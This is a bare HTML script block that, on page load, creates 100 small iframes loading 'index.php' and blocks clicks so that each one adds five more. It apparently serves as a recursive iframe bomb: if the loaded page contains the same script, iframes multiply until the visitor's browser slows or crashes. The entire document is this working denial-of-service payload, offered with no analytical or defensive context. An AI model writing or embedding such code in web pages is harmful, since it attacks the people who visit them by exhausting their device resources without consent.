<script> 

var SCREEN_WIDTH = window.innerWidth, SCREEN_HEIGHT = window.innerHeight; 

document.addEventListener("mousedown", function(e){e.preventDefault();makeIFrame(5);}); 
var iframes = []; 

makeIFrame(100); 

function makeIFrame(num) { 
	if(!num) num = 1; 
	
	for(var i=0;i<num; i++) { 
		var iframe = document.createElement('iframe'); 
		iframe.src = "index.php"; 
		iframe.width = iframe.height = 40; 
		var count = iframes.length; 
	//	iframe.style.left = ((count*50) % (window.innerWidth-50)) + 'px'; 
	//	iframe.style.top = (Math.floor((count*50) / (window.innerWidth-50))*50) +'px';
		
		document.body.appendChild(iframe);
		iframes.push(iframe); 
	}
	
	
}
</script>
